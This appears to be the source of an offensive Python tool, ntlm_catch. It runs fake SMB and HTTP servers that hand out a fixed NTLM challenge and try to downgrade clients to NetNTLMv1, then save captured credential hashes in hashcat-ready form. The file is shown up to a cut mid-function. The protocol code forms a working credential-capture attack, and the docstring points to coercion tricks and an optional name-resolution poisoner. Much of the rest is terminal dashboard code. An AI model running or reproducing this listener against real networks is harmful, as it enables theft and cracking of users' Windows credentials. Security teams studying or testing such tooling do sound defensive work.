#!/usr/bin/env python3
"""ntlm_catch — minimal NetNTLM capture listener (SMB + HTTP) with v1 downgrade.

A deliberately small, single-file tool that does ONE thing: stand up SMB (445)
and/or HTTP (80) endpoints that answer with an NTLM challenge, hand out a
*fixed* server challenge ("response key"), try to downgrade the client to
NetNTLMv1, then parse and log the Type-3 response in full and emit hashcat-ready
lines.

It is a LISTENER with an optional, explicitly scoped lab poisoner:

  * Poisoning is disabled by default. You can point coerced auth at it yourself:
    PetitPotam / PrinterBug / DFSCoerce -> SMB(445); WebDAV / Exchange / @80
    tricks -> HTTP(80).
  * Optional LLMNR / NBT-NS / mDNS responses require an explicit listener IP
    and source CIDR. Analyze mode observes without answering.
  * No relay, no payloads. It only records what authenticates to it.
  * Never silent. It prints a line the instant a TCP connection is accepted,
    before any protocol parsing — so if tcpdump shows packets, you see them
    here too. (Stock Responder only logs on a *successful* NTLM parse and its
    stdout buffers, which is why it can look dead while traffic arrives.)

NetNTLM (v1 and v2) is the same NTLMSSP Type-1/2/3 exchange on every transport;
v1-vs-v2 is decided by the client's LmCompatibilityLevel plus the ESS flag in
our challenge — NOT by the port. So the same fixed-challenge + downgrade logic
works over SMB and HTTP alike.

Pure Python 3.7+ stdlib. Authorized testing only.
"""
import argparse
import atexit
import binascii
import base64
import collections
import datetime
import itertools
import os
import re
import select
import shutil
import signal
import socket
import socketserver
import ssl
import struct
import sys
import threading
import time
import traceback
import unicodedata
try:
    import termios
    import tty
except ImportError:
    termios = None
    tty = None
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from name_poisoner import NamePoisoner

# ---- NTLM constants --------------------------------------------------------

NTLMSSP_SIG = b"NTLMSSP\x00"
MAX_MESSAGE_SIZE = 1024 * 1024

# Type-2 negotiate flags. 0xe2898215 is the usual set; clearing ESS
# (0x00080000) -> 0xe2818215 asks the client to drop NTLM2 session security and
# fall back to plain NetNTLMv1 where its policy allows.
FLAGS_NORMAL = 0xE2898215
FLAGS_NOESS = FLAGS_NORMAL & ~0x00080000  # 0xE2818215

AV_EOL = 0x0000
AV_NB_COMPUTER = 0x0001
AV_NB_DOMAIN = 0x0002
AV_DNS_COMPUTER = 0x0003
AV_DNS_DOMAIN = 0x0004
AV_TIMESTAMP = 0x0007


def _u16(b, off):
    return struct.unpack("<H", b[off:off + 2])[0]


def _u32(b, off):
    return struct.unpack("<I", b[off:off + 4])[0]


def _av(av_id, value_utf16le):
    return struct.pack("<HH", av_id, len(value_utf16le)) + value_utf16le


def _filetime_now():
    epoch = datetime.datetime(1601, 1, 1, tzinfo=datetime.timezone.utc)
    now = datetime.datetime.now(datetime.timezone.utc)
    return struct.pack("<Q", int((now - epoch).total_seconds() * 10_000_000))


def hexu(b):
    return binascii.hexlify(b).upper().decode()


# ---- Type-2 (challenge) builder — transport independent -------------------

def build_type2(challenge8, domain, computer, downgrade):
    """Raw NTLMSSP Type-2 challenge message. Used for both SMB and HTTP."""
    flags = FLAGS_NOESS if downgrade else FLAGS_NORMAL

    dom_u = domain.encode("utf-16-le")
    comp_u = computer.encode("utf-16-le")
    dnscomp_u = (computer + "." + domain).encode("utf-16-le")

    target_name = dom_u
    target_info = (
        _av(AV_NB_DOMAIN, dom_u)
        + _av(AV_NB_COMPUTER, comp_u)
        + _av(AV_DNS_DOMAIN, dom_u)
        + _av(AV_DNS_COMPUTER, dnscomp_u)
        + _av(AV_TIMESTAMP, _filetime_now())
        + struct.pack("<HH", AV_EOL, 0)
    )

    # Fixed header is 56 bytes (incl. the 8-byte Version field).
    header_len = 56
    tn_off = header_len
    ti_off = tn_off + len(target_name)

    msg = bytearray()
    msg += NTLMSSP_SIG
    msg += struct.pack("<I", 2)
    msg += struct.pack("<HHI", len(target_name), len(target_name), tn_off)
    msg += struct.pack("<I", flags)
    msg += challenge8
    msg += b"\x00" * 8
    msg += struct.pack("<HHI", len(target_info), len(target_info), ti_off)
    msg += struct.pack("<BBH", 6, 1, 7601) + b"\x00\x00\x00" + b"\x0f"
    assert len(msg) == header_len, len(msg)
    msg += target_name
    msg += target_info
    return bytes(msg)


# ---- Type-3 (response) parser — transport independent ----------------------

class Type3:
    __slots__ = ("lm", "nt", "domain", "user", "host", "flags",
                 "is_v1", "is_v1_ess", "raw_len")


def parse_type3(data):
    """Parse an NTLM Type-3 message. `data` must start at the NTLMSSP sig."""
    if len(data) < 52 or data[:8] != NTLMSSP_SIG or _u32(data, 8) != 3:
        raise ValueError("invalid or truncated NTLM Type-3 message")

    def field(name, len_off, off_off, text=False):
        size = _u16(data, len_off)
        offset = _u32(data, off_off)
        if offset > len(data) or size > len(data) - offset:
            raise ValueError("%s field points outside Type-3 message" % name)
        if text and size % 2:
            raise ValueError("%s field has odd UTF-16 length" % name)
        value = data[offset:offset + size]
        return value.decode("utf-16-le", "replace") if text else value

    t = Type3()
    t.lm = field("LM response", 12, 16)
    t.nt = field("NT response", 20, 24)
    t.domain = field("domain", 28, 32, text=True)
    t.user = field("user", 36, 40, text=True)
    t.host = field("workstation", 44, 48, text=True)
    t.flags = _u32(data, 60) if len(data) >= 64 else 0
    t.raw_len = len(t.nt)

    if t.nt and len(t.nt) != 24 and len(t.nt) < 32:
        raise ValueError("unsupported NT response length: %d" % len(t.nt))

    t.is_v1 = len(t.nt) == 24
    # NTLM2 session response (v1 shape + ESS): 24-byte NT, LM = 8-byte client
    # challenge + zero padding. Not crack.sh-friendly.
    t.is_v1_ess = (
        t.is_v1
        and len(t.lm) >= 24
        and t.lm[8:24] == b"\x00" * 16
        and t.lm[:8] != b"\x00" * 8
    )
    return t


def format_v1(t, challenge_hex):
    # hashcat -m 5500 :  user::HOST:LM:NT:SERVERCHALLENGE
    return "%s::%s:%s:%s:%s" % (
        t.user, t.host or t.domain, hexu(t.lm), hexu(t.nt), challenge_hex)


def format_v2(t, challenge_hex):
    # hashcat -m 5600 :  user::DOMAIN:SERVERCHALLENGE:NT[:32]:NT[32:]
    nt_hex = hexu(t.nt)
    return "%s::%s:%s:%s:%s" % (
        t.user, t.domain, challenge_hex, nt_hex[:32], nt_hex[32:])


# ---- SPNEGO / GSS-API DER helpers (for the SMB security blobs) -------------

SPNEGO_OID = binascii.unhexlify("2b0601050502")          # 1.3.6.1.5.5.2
NTLM_OID = binascii.unhexlify("2b06010401823702020a")    # 1.3.6.1.4.1.311.2.2.10


def der_len(n):
    if n < 0x80:
        return bytes([n])
    out = b""
    while n:
        out = bytes([n & 0xFF]) + out
        n >>= 8
    return bytes([0x80 | len(out)]) + out


def der(tag, content):
    return bytes([tag]) + der_len(len(content)) + content


def spnego_neg_init():
    """NegTokenInit advertising NTLM — sent in the NEGOTIATE response."""
    mechtypes = der(0x30, der(0x06, NTLM_OID))       # SEQUENCE OF mechType
    tag0 = der(0xA0, mechtypes)                       # [0] mechTypes
    neg = der(0x30, tag0)                             # NegTokenInit SEQUENCE
    inner = der(0xA0, neg)                            # [0] negTokenInit
    return der(0x60, der(0x06, SPNEGO_OID) + inner)   # [APPLICATION 0] GSSAPI


def spnego_challenge(type2):
    """NegTokenResp carrying our Type-2 — sent in SESSION_SETUP #1."""
    neg_state = der(0xA0, der(0x0A, b"\x01"))         # accept-incomplete
    sup_mech = der(0xA1, der(0x06, NTLM_OID))         # supportedMech = NTLM
    resp_tok = der(0xA2, der(0x04, type2))            # responseToken
    return der(0xA1, der(0x30, neg_state + sup_mech + resp_tok))


# ---- SMB2 packet builders --------------------------------------------------

SMB2_MAGIC = b"\xfeSMB"
STATUS_SUCCESS = 0x00000000
STATUS_MORE_PROCESSING = 0xC0000016
STATUS_LOGON_FAILURE = 0xC000006D


def smb2_header(cmd, msg_id, session_id, status):
    h = SMB2_MAGIC
    h += struct.pack("<H", 64)             # StructureSize
    h += struct.pack("<H", 0)              # CreditCharge
    h += struct.pack("<I", status)         # Status
    h += struct.pack("<H", cmd)            # Command
    h += struct.pack("<H", 1)              # CreditResponse
    h += struct.pack("<I", 0x00000001)     # Flags = SERVER_TO_REDIR
    h += struct.pack("<I", 0)              # NextCommand
    h += struct.pack("<Q", msg_id)         # MessageId
    h += struct.pack("<I", 0x0000FEFF)     # Reserved (ProcessId, cosmetic)
    h += struct.pack("<I", 0)              # TreeId
    h += struct.pack("<Q", session_id)     # SessionId
    h += b"\x00" * 16                       # Signature
    return h


def smb2_negotiate_resp(msg_id, dialect, secbuf):
    hdr = smb2_header(0x0000, msg_id, 0, STATUS_SUCCESS)
    body = struct.pack("<H", 65)           # StructureSize
    body += struct.pack("<H", 1)           # SecurityMode (signing enabled)
    body += struct.pack("<H", dialect)     # DialectRevision
    body += struct.pack("<H", 0)           # NegotiateContextCount/Reserved
    body += os.urandom(16)                 # ServerGuid
    body += struct.pack("<I", 0)           # Capabilities
    body += struct.pack("<I", 0x00100000)  # MaxTransactSize
    body += struct.pack("<I", 0x00100000)  # MaxReadSize
    body += struct.pack("<I", 0x00100000)  # MaxWriteSize
    body += _filetime_now()                # SystemTime
    body += b"\x00" * 8                     # ServerStartTime
    body += struct.pack("<H", 128)         # SecurityBufferOffset (64+64)
    body += struct.pack("<H", len(secbuf))  # SecurityBufferLength
    body += struct.pack("<I", 0)           # NegotiateContextOffset/Reserved2
    return hdr + body + secbuf


def smb2_session_setup_resp(msg_id, session_id, status, secbuf):
    hdr = smb2_header(0x0001, msg_id, session_id, status)
    body = struct.pack("<HHHH", 9, 0, 72, len(secbuf))  # size,flags,off,len
    return hdr + body + secbuf


# ---- capture sink ----------------------------------------------------------

def _open_private(path, mode="a", buffering=-1):
    """Open a loot file with owner-only permissions, including existing files."""
    flags = os.O_WRONLY | os.O_CREAT
    flags |= os.O_APPEND if "a" in mode else os.O_TRUNC
    fd = os.open(path, flags, 0o600)
    try:
        os.chmod(path, 0o600)
        return os.fdopen(fd, mode, buffering=buffering)
    except Exception:
        os.close(fd)
        raise


class Sink:
    def __init__(self, outdir, challenge_hex, stats=None):
        self.outdir = outdir
        self.challenge_hex = challenge_hex
        self.stats = stats
        self.lock = threading.Lock()
        os.makedirs(outdir, exist_ok=True)
        try:
            os.chmod(outdir, 0o700)
        except OSError:
            pass
        self.v1_file = os.path.join(outdir, "netntlmv1.txt")
        self.v2_file = os.path.join(outdir, "netntlmv2.txt")
        self.log_file = os.path.join(outdir, "capture.log")
        self.seen = set()
        for path in (self.v1_file, self.v2_file):
            try:
                with open(path, "r") as fh:
                    self.seen.update(line.strip() for line in fh if line.strip())
            except FileNotFoundError:
                pass

    @staticmethod
    def _filename_part(value, fallback):
        value = re.sub(r"[^A-Za-z0-9._-]+", "_", value or "").strip("._-")
        return value[:64] or fallback

    def _write_capture_file(self, captured_at, client_ip, t, source, kind,
                            hashline):
        """Write one hash per file; O_EXCL also makes concurrent names safe."""
        parts = (
            captured_at.strftime("%Y%m%dT%H%M%S.%f"),
            self._filename_part(source.lower(), "unknown"),
            self._filename_part(client_ip, "unknown-ip"),
            self._filename_part(t.domain, "no-domain"),
            self._filename_part(t.user, "no-user"),
            self._filename_part(kind.lower(), "ntlm"),
        )
        stem = "_".join(parts)
        for suffix in range(1000):
            name = stem + ("_%d" % suffix if suffix else "") + ".txt"
            path = os.path.join(self.outdir, name)
            try:
                fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
            except FileExistsError:
                continue
            with os.fdopen(fd, "w") as fh:
                fh.write(hashline + "\n")
            return path
        raise OSError("could not allocate a unique capture filename")

    def handle(self, client_ip, t, source):
        # Null / anonymous session: no NT response and no user -> nothing to
        # crack. Note it but don't pollute the loot files.
        if len(t.nt) == 0 and not t.user:
            print(Color.d("[%s] %s anonymous/null session (no hash)"
                          % (source, client_ip)))
            return

        captured_at = datetime.datetime.now()
        stamp = captured_at.strftime("%Y-%m-%d %H:%M:%S")
        if t.is_v1:
            kind = "NetNTLMv1-SSP(ESS)" if t.is_v1_ess else "NetNTLMv1"
            hashline = format_v1(t, self.challenge_hex)
            mode = "5500"
        else:
            kind = "NetNTLMv2"
            hashline = format_v2(t, self.challenge_hex)
            mode = "5600"

        with self.lock:
            dup = hashline in self.seen
            self.seen.add(hashline)
            if self.stats is not None:
                self.stats["captures_total"] += 1
                if t.is_v1:
                    self.stats["captures_v1"] += 1
                else:
                    self.stats["captures_v2"] += 1
                self.stats["last_capture"] = "%s\\%s (%s)" % (t.domain or "-", t.user or "-", kind)

        C = Color
        print(C.b("\n[+] [%s] NTLM %s captured  <- %s" % (source, kind, client_ip)))
        print("    time        : %s" % stamp)
        print("    account     : %s\\%s" % (t.domain or "-", t.user or "-"))
        print("    workstation : %s" % (t.host or "-"))
        print("    NT resp len : %d bytes   (LM resp %d bytes)"
              % (len(t.nt), len(t.lm)))
        print("    neg flags   : 0x%08x" % t.flags)
        if t.is_v1_ess:
            print(C.y("    ! NTLM2 session security (ESS) — hashcat -m 5500 "
                      "supports it, but crack.sh does not."))
        elif t.is_v1:
            print(C.g("    * downgrade OK — pure NetNTLMv1, crackable with the "
                      "fixed challenge (crack.sh / hashcat -m 5500)."))
        else:
            print(C.y("    * client stayed on NetNTLMv2 (hardened policy). "
                      "hashcat -m 5600."))
        print("    hashcat -m %s:" % mode)
        print("      " + C.b(hashline))
        if dup:
            print(C.d("    (duplicate — already recorded)"))

        rec = ("%s | %s | %s | %s | %s\\%s @ %s | flags=0x%08x | %s"
               % (stamp, source, client_ip, kind, t.domain, t.user, t.host,
                  t.flags, hashline))
        with self.lock:
            with _open_private(self.log_file) as fh:
                fh.write(rec + "\n")
            capture_file = self._write_capture_file(
                captured_at, client_ip, t, source, kind, hashline)
            if not dup:
                target = self.v1_file if t.is_v1 else self.v2_file
                with _open_private(target) as fh:
                    fh.write(hashline + "\n")
        print(C.d("    saved       : %s" % capture_file))


# ---- color & ANSI formatting -----------------------------------------------

_ANSI_RE = re.compile(r"(\x1b\[[0-9;]*[a-zA-Z])")


def strip_ansi(s):
    return _ANSI_RE.sub("", s) if s else ""


def visible_len(s):
    return sum(_char_width(ch) for ch in strip_ansi(s))


def _char_width(ch):
    """Best-effort terminal cell width without third-party dependencies."""
    if unicodedata.combining(ch):
        return 0
    return 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1


def ansi_fit(s, width):
    """Pad or truncate string to exact visible width, preserving ANSI sequences."""
    if width <= 0:
        return ""
    tokens = _ANSI_RE.split(s)
    res = []
    vis = 0
    had_escape = False
    for token in tokens:
        if not token:
            continue
        if token.startswith("\x1b["):
            res.append(token)
            had_escape = True
        else:
            for ch in token:
                cells = _char_width(ch)
                if vis + cells > width:
                    break
                res.append(ch)
                vis += cells
            if vis >= width:
                break
    if had_escape:
        res.append("\x1b[0m")
    if vis < width:
        res.append(" " * (width - vis))
    return "".join(res)


def ansi_wrap(s, width):
    """Wrap string containing ANSI codes into lines of visible length <= width."""
    if width <= 0:
        return [s]
    tokens = _ANSI_RE.split(s)
    lines = []
    cur_line = []
    cur_vis = 0
    active_escapes = []
    for token in tokens:
        if not token:
            continue
        if token.startswith("\x1b["):
            cur_line.append(token)
            if token == "\x1b[0m":
                active_escapes = []
            else:
                active_escapes.append(token)
        else:
            for ch in token:
                cells = _char_width(ch)
                if cur_vis and cur_vis + cells > width:
                    if active_escapes:
                        cur_line.append("\x1b[0m")
                    lines.append("".join(cur_line))
                    cur_line = list(active_escapes)
                    cur_vis = 0
                    if ch == " ":
                        continue
                cur_line.append(ch)
                cur_vis += cells
    if cur_line:
        if active_escapes:
            cur_line.append("\x1b[0m")
        lines.append("".join(cur_line))
    return lines or [""]


class Color:
    on = sys.stdout.isatty()

    @classmethod
    def set_on(cls, enabled):
        cls.on = bool(enabled)

    @staticmethod
    def _w(s, c):
        return "\033[%sm%s\033[0m" % (c, s) if Color.on else s

    @staticmethod
    def b(s): return Color._w(s, "1;36")      # Bold Cyan
    @staticmethod
    def g(s): return Color._w(s, "1;32")      # Bold Green
    @staticmethod
    def y(s): return Color._w(s, "1;33")      # Bold Yellow
    @staticmethod
    def r(s): return Color._w(s, "1;31")      # Bold Red
    @staticmethod
    def m(s): return Color._w(s, "1;35")      # Bold Magenta
    @staticmethod
    def w(s): return Color._w(s, "1;37")      # Bold White
    @staticmethod
    def d(s): return Color._w(s, "0;90")      # Dim / Gray
    @staticmethod
    def c(s): return Color._w(s, "0;36")      # Standard Cyan
    @staticmethod
    def blue(s): return Color._w(s, "1;34")   # Bold Blue


# ---- persistent full console log ------------------------------------------

class _Tee:
    """Mirror everything printed to the console into a file (ANSI stripped),
    so the full connection/handshake trace is persisted, not just captures."""

    def __init__(self, stream, fh):
        self._stream = stream
        self._fh = fh

    def isatty(self):
        return hasattr(self._stream, "isatty") and self._stream.isatty()

    def fileno(self):
        return self._stream.fileno()

    def write(self, s):
        self._stream.write(s)
        self._fh.write(strip_ansi(s))
        return len(s)

    def flush(self):
        self._stream.flush()
        self._fh.flush()


_IP_PORT_RE = re.compile(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?::(\d+))?\b")


def _colorize_raw(line):
    """Subtle syntax highlighting for raw protocol log if uncolored."""
    if "\x1b[" in line:
        return line
    s = line
    s = _IP_PORT_RE.sub(lambda m: "\x1b[36m" + m.group(1) + ("\x1b[90m:\x1b[36m" + m.group(2) if m.group(2) else "") + "\x1b[0m", s)
    s = re.sub(r"(\[(?:smb(?:\s+wire)?|http)\])", lambda m: "\x1b[1;34m" + m.group(1) + "\x1b[0m", s)
    s = re.sub(r"(\[(?:smb|http)\s+conn\s+#[0-9]+[^\]]*\])", lambda m: "\x1b[90m" + m.group(1) + "\x1b[0m", s)
    s = re.sub(r"(SESSION_SETUP|NEGOTIATE)", lambda m: "\x1b[1;33m" + m.group(1) + "\x1b[0m", s)
    s = re.sub(r"(Type-[123])", lambda m: "\x1b[1;35m" + m.group(1) + "\x1b[0m", s)
    s = re.sub(r"(\[!\].*)", lambda m: "\x1b[1;33m" + m.group(1) + "\x1b[0m", s)
    s = re.sub(r"(\[\+\].*)", lambda m: "\x1b[1;32m" + m.group(1) + "\x1b[0m", s)
    return s


def _format_event(line):
    """Format meaningful protocol event for the left dashboard pane."""
    plain = strip_ansi(line).strip()
    if not plain:
        return None
    if plain.startswith("[smb wire]"):
        return None
    if plain.startswith("ntlm_catch") or plain.startswith("challenge   :") or \
       plain.startswith("downgrade   :") or plain.startswith("advertising :") or \
       plain.startswith("loot dir    :") or plain.startswith("no poisoning"):
        return None

    now = datetime.datetime.now().strftime("%H:%M:%S")
    ts = f"\x1b[90m{now}\x1b[0m"
    pad = "          "

    if plain.startswith("[poison]"):
        return (f"{ts} \x1b[1;31m[POISON]\x1b[0m " +
                f"\x1b[0;36m{plain[len('[poison]'):].strip()}\x1b[0m")

    # Capture header
    m = re.search(r"\[\+\]\s+\[(\w+)\]\s+NTLM\s+(\S+)\s+captured\s+<-\s+([0-9.]+)", plain)
    if m:
        proto, kind, ip = m.groups()
        pcol = "\x1b[1;34m" if proto.lower() == "smb" else "\x1b[1;35m"
        return f"{ts} \x1b[1;32m● CAPTURE\x1b[0m {pcol}[{proto}]\x1b[0m \x1b[1;37m{kind}\x1b[0m <- \x1b[1;36m{ip}\x1b[0m"

    # Capture details
    if plain.startswith("account     :"):
        val = plain.split(":", 1)[1].strip()
        return f"{pad}\x1b[90maccount    :\x1b[0m \x1b[1;33m{val}\x1b[0m"
    if plain.startswith("workstation :"):
        val = plain.split(":", 1)[1].strip()
        return f"{pad}\x1b[90mworkstation:\x1b[0m \x1b[1;37m{val}\x1b[0m"
    if plain.startswith("hashcat -m"):
        return f"{pad}\x1b[1;33m{plain}\x1b[0m"
    if plain.startswith("saved       :"):
        path = plain.split(":", 1)[1].strip()
        base = os.path.basename(path)
        return f"{pad}\x1b[90msaved      :\x1b[0m \x1b[0;32m{base}\x1b[0m"
    if "* downgrade OK" in plain:
        return f"{pad}\x1b[1;32m* downgrade OK (pure NetNTLMv1)\x1b[0m"
    if "* client stayed" in plain:
        return f"{pad}\x1b[1;33m* client stayed on NetNTLMv2\x1b[0m"
    if "(duplicate" in plain:
        return f"{pad}\x1b[90m(duplicate hash)\x1b[0m"
    if "::" in plain and not plain.startswith("http"):
        h = plain.strip()
        return f"{pad}\x1b[0;36m{h[:64]}...\x1b[0m" if len(h) > 64 else f"{pad}\x1b[0;36m{h}\x1b[0m"

    # TCP connection
    m = re.search(r"\[(\w+)\s+conn\s+#(\d+)\s+([\d:]+)\]\s+TCP from\s+([0-9.]+:\d+)", plain)
    if m:
        proto, cnum, conn_ts, addr = m.groups()
        pcol = "\x1b[1;34m" if proto.lower() == "smb" else "\x1b[1;35m"
        return f"\x1b[90m{conn_ts}\x1b[0m {pcol}[{proto}]\x1b[0m TCP from \x1b[1;36m{addr}\x1b[0m \x1b[90m(#{cnum})\x1b[0m"

    # SMB Stages
    m = re.search(r"\[smb\]\s+([0-9.]+)\s+SESSION_SETUP\s+\(Type-([13])\)", plain)
    if m:
        ip, t_num = m.groups()
        if t_num == "1":
            return f"{ts} \x1b[1;34m[SMB]\x1b[0m \x1b[1;36m{ip}\x1b[0m Type-1 -> \x1b[1;33mChallenge Sent\x1b[0m"
        else:
            return f"{ts} \x1b[1;34m[SMB]\x1b[0m \x1b[1;36m{ip}\x1b[0m Type-3 \x1b[1;35mAuth Received\x1b[0m"

    m = re.search(r"\[smb\]\s+([0-9.]+)\s+NEGOTIATE", plain)
    if m:
        ip = m.group(1)
        return f"{ts} \x1b[1;34m[SMB]\x1b[0m \x1b[1;36m{ip}\x1b[0m NEGOTIATE"

    # HTTP Stages
    m = re.search(r"\[http\]\s+([A-Z]+)\s+(\S+)\s+from\s+([0-9.]+)\s+\(auth:\s*([^)]*)\)", plain)
    if m:
        method, path, ip, auth = m.groups()
        if "no-auth" in auth:
            return f"{ts} \x1b[1;35m[HTTP]\x1b[0m \x1b[1;36m{ip}\x1b[0m {method} {path} \x1b[90m(no auth -> 401)\x1b[0m"
        else:
            return f"{ts} \x1b[1;35m[HTTP]\x1b[0m \x1b[1;36m{ip}\x1b[0m {method} {path} \x1b[1;33m(auth: {auth})\x1b[0m"

    m = re.search(r"\[http\]\s+([0-9.]+)\s+Type-1\s+->\s+challenge sent", plain)
    if m:
        ip = m.group(1)
        return f"{ts} \x1b[1;35m[HTTP]\x1b[0m \x1b[1;36m{ip}\x1b[0m Type-1 -> \x1b[1;33mChallenge Sent\x1b[0m"

    # Warnings / Errors
    if "[!]" in plain:
        return f"{ts} \x1b[1;33m{plain}\x1b[0m"

    # Listener start
    m = re.search(r"\[\+\]\s+(SMB|HTTP)\s+listening on\s+(\S+)", plain)
    if m:
        proto, ep = m.groups()
        pcol = "\x1b[1;34m" if proto.upper() == "SMB" else "\x1b[1;35m"
        return f"{ts} \x1b[1;32m[+]\x1b[0m {pcol}{proto}\x1b[0m online at \x1b[1;36m{ep}\x1b[0m"

    # Other relevant markers
    if any(marker in plain for marker in ("closed/reset", "timeout", "anonymous", "stopped", "stopping")):
        return f"{ts} \x1b[90m{plain}\x1b[0m"

    return None


class _SplitView:
    """Dynamic TTY dashboard: colored protocol events left, live raw log right."""

    _PULSE_COLORS = ("1;32", "1;32", "0;32", "0;90", "0;32", "1;32")

    def __init__(self, stream, log_fh, stats=None):
        self._stream = stream
        self._log_fh = log_fh
        self._stats = stats or {}
        self._raw = collections.deque(maxlen=2000)
        self._info = collections.deque(maxlen=1000)
        self._partial = ""
        self._lock = threading.RLock()
        self._closed = False
        self._needs_clear = False
        self._last_render = 0.0
        self._tick_count = 0
        self._stop_ticker = threading.Event()

        self._active_pane = "right"
        self._scroll_left = 0
        self._scroll_right = 0

        self._stdin_fd = None
        self._old_termios = None
        if termios is not None and tty is not None and hasattr(sys.stdin, "fileno") and sys.stdin.isatty():
            try:
                self._stdin_fd = sys.stdin.fileno()
                self._old_termios = termios.tcgetattr(self._stdin_fd)
                tty.setcbreak(self._stdin_fd)
            except Exception:
                self._stdin_fd = None
                self._old_termios = None

        # Switch to alternate screen, hide cursor, and enable SGR mouse tracking
        self._stream.write("\033[?1049h\033[?25l\033[?1000h\033[?1006h")
        self._stream.flush()

        # SIGWINCH resize listener
        self._old_sigwinch = None
        if hasattr(signal, "SIGWINCH"):
            try:
                self._old_sigwinch = signal.signal(signal.SIGWINCH, self._on_sigwinch)
            except Exception:
                pass

        # Start dynamic periodic repainting thread (4 Hz)
        self._ticker = threading.Thread(target=self._ticker_loop, daemon=True, name="split-view-ticker")
        self._ticker.start()

        # Start interactive keyboard/mouse input thread
        if self._stdin_fd is not None:
            self._input_thread = threading.Thread(target=self._input_loop, daemon=True, name="split-view-input")
            self._input_thread.start()

        self._render()

    def isatty(self):
        return hasattr(self._stream, "isatty") and self._stream.isatty()

    def fileno(self):
        return self._stream.fileno()

    @staticmethod
    def available(stream):
        size = shutil.get_terminal_size((120, 30))
        return stream.isatty() and size.columns >= 76 and size.lines >= 14

    def _on_sigwinch(self, signum, frame):
        with self._lock:
            self._needs_clear = True
        self._render()
        if callable(self._old_sigwinch):
            try:
                self._old_sigwinch(signum, frame)
            except Exception:
                pass

    def _ticker_loop(self):
        while not self._stop_ticker.is_set():
            self._tick_count += 1
            self._render()
            self._stop_ticker.wait(0.25)

    def _parse_input(self, buf):
        actions = []
        i = 0
        n = len(buf)
        while i < n:
            if buf[i:i+1] == "\x1b":
                if i + 1 == n:
                    # Keep an incomplete escape sequence for the next read.
                    break
                if buf[i+1] == "[":
                    if i + 2 < n and buf[i+2] == "<":
                        end = i + 3
                        while end < n and buf[end] not in ("M", "m"):
                            end += 1
                        if end < n:
                            seq = buf[i+3:end]
                            parts = seq.split(";")
                            btn_code = parts[0] if parts else ""
                            x_coord = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
                            actions.append(("mouse", btn_code, x_coord, buf[end]))
                            i = end + 1
                            continue
                        else:
                            break
                    end = i + 2
                    while end < n and not (buf[end].isalpha() or buf[end] == "~"):
                        end += 1
                    if end < n:
                        seq = buf[i+2:end+1]
                        if seq == "A": actions.append("up")
                        elif seq == "B": actions.append("down")
                        elif seq == "C": actions.append("right")
                        elif seq == "D": actions.append("left")
                        elif seq in ("5~", "I"): actions.append("page_up")
                        elif seq in ("6~", "G"): actions.append("page_down")
                        elif seq in ("H", "1~"): actions.append("home")
                        elif seq in ("F", "4~"): actions.append("end")
                        i = end + 1
                        continue
                    else:
                        break
                elif buf[i+1] == "O":
                    if i + 2 < n:
                        c = buf[i+2]
                        if c == "A": actions.append("up")
                        elif c == "B": actions.append("down")
                        elif c == "C": actions.append("right")
                        elif c == "D": actions.append("left")
                        elif c == "H": actions.append("home")
                        elif c == "F": actions.append("end")
                        i += 3
                        continue
                    else:
                        break
                else:
                    actions.append("esc")
                    i += 1
            else:
                ch = buf[i]
                if ch in ("k", "K"): actions.append("up")
                elif ch in ("j", "J"): actions.append("down")
                elif ch in ("\t",): actions.append("tab")
                elif ch in ("q", "Q"): actions.append("quit")
                elif ch in ("g",): actions.append("home")
                elif ch in ("G",): actions.append("end")
                elif ch in ("u",): actions.append("half_page_up")
                elif ch in ("d",): actions.append("half_page_down")
                elif ch in ("f", " "): actions.append("page_down")
                elif ch in ("b",): actions.append("page_up")
                elif ch == "1": actions.append("toggle_llmnr")
                elif ch == "2": actions.append("toggle_nbns")
                elif ch == "3": actions.append("toggle_mdns")
                elif ch == "\x03": actions.append("interrupt")
                i += 1
        return actions, buf[i:]

    def _handle_action(self, act):
        size = shutil.get_terminal_size((120, 30))
        body_height = max(1, size.lines - 6)
        page_step = max(1, body_height - 2)

        if act == "up":
            if self._active_pane == "left":
                self._scroll_left += 1
            else:
                self._scroll_right += 1
        elif act == "down":
            if self._active_pane == "left":
                self._scroll_left = max(0, self._scroll_left - 1)
            else:
                self._scroll_right = max(0, self._scroll_right - 1)
        elif act in ("page_up", "half_page_up"):
            step = page_step if act == "page_up" else max(1, body_height // 2)
            if self._active_pane == "left":
                self._scroll_left += step
            else:
                self._scroll_right += step
        elif act in ("page_down", "half_page_down"):
            step = page_step if act == "page_down" else max(1, body_height // 2)
            if self._active_pane == "left":
                self._scroll_left = max(0, self._scroll_left - step)
            else:
                self._scroll_right = max(0, self._scroll_right - step)
        elif act == "home":
            if self._active_pane == "left":
                self._scroll_left = 999999
            else:
                self._scroll_right = 999999
        elif act == "end":
            if self._active_pane == "left":
                self._scroll_left = 0
            else:
                self._scroll_right = 0
        elif act in ("tab", "left", "right"):
            if act == "left":
                self._active_pane = "left"
            elif act == "right":
                self._active_pane = "right"
            else:
                self._active_pane = "left" if self._active_pane == "right" else "right"
        elif isinstance(act, str) and act.startswith("toggle_"):
            poisoner = self._stats.get("poisoner")
            if poisoner is not None:
                poisoner.toggle(act.split("_", 1)[1])
        elif isinstance(act, tuple) and act[0] == "mouse":
            btn, x = act[1], act[2]
            left_w = max(34, int(size.columns * 0.46))
            target = "left" if x <= left_w + 1 else "right"
            if btn == "64":  # wheel up
                self._active_pane = target
                if target == "left":
                    self._scroll_left += 3
                else:
                    self._scroll_right += 3
            elif btn == "65":  # wheel down
                self._active_pane = target
                if target == "left":
                    self._scroll_left = max(0, self._scroll_left - 3)
                else:
                    self._scroll_right = max(0, self._scroll_right - 3)
            elif btn == "0":  # click
                self._active_pane = target
        elif act in ("quit", "interrupt"):
            try:
                os.kill(os.getpid(), signal.SIGINT)
            except Exception:
                pass

    def _input_loop(self):
        buf = ""
        while not self._stop_ticker.is_set() and not self._closed:
            try:
                r, _, _ = select.select([self._stdin_fd], [], [], 0.1)
                if not r:
                    continue
                chunk = os.read(self._stdin_fd, 1024)
                if not chunk:
                    break
                buf += chunk.decode("utf-8", errors="replace")
                actions, buf = self._parse_input(buf)
                if actions:
                    with self._lock:
                        for act in actions:
                            self._handle_action(act)
                    self._render()
            except Exception:
                break

    def write(self, data):
        if not data:
            return 0
